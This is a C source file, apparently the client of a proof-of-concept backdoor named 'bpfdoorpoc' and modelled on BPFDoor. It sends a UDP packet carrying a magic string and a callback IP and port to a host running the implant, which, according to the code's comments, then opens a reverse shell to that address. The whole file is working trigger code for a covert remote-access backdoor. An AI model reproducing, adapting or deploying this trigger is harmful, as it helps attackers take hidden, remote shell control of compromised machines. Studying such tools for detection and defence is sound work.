#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#include "shared.h"

int main (int argc, char *argv[])
{
	struct sockaddr_in sin;
	int sin_len = sizeof (sin);
	int sock;

	char *srv_ip = SERVER_IP;
	char *srv_port_str = STR(REVERSE_SHELL_PORT); // Rename to avoid confusion with integer port
	char payload[128]; // Increased buffer size
	int payload_buf_sz = sizeof(payload);
	long srv_port_num; // Use long for strtol

	if (argc >= 2) {
		srv_ip = argv[1];
	}
	if (argc >= 3) {
		srv_port_str = argv[2];
	}

	// Validate srv_port_str
	char *endptr;
	srv_port_num = strtol(srv_port_str, &endptr, 10);
	if (*endptr != '\0' || srv_port_num <= 0 || srv_port_num > 65535) {
		fprintf(stderr, "error: invalid reverse shell port: %s\n", srv_port_str);
		exit(1);
	}

	// build payload
	int snprintf_res = snprintf(payload, payload_buf_sz, "%s%s:%ld", MAGIC_STR, srv_ip, srv_port_num);
	if (snprintf_res < 0 || snprintf_res >= payload_buf_sz) {
		fprintf(stderr, "error: payload creation failed or truncated\n");
		exit(1);
	}
	int payload_len = snprintf_res + 1; // include null byte

	if ((sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
	{
		perror("error opening socket");
		exit(1);
	}

	memset ((char *) &sin, 0, sizeof (sin));
	sin.sin_family = AF_INET;
	
	// bpfdoorpoc ip & port
	sin.sin_port = htons (SERVER_PORT);
	// Use inet_pton instead of inet_aton
	if (inet_pton(AF_INET, srv_ip, &sin.sin_addr) <= 0) {
		fprintf(stderr, "error: invalid server IP address: %s\n", srv_ip);
		exit(1);
	}

	fprintf(stderr, "Sending payload to %s:%i\n", srv_ip, SERVER_PORT);
	
	// magicbyte + target-ip:port for bpfdoorpoc to reverse shell
	if ((sendto (sock, payload, payload_len, 0, (struct sockaddr *) &sin, sin_len)) < 0)
	{
		perror("error sending data");
		exit(1);
	}

	printf("Sent payload: %s\n", payload);
	return 0;
}
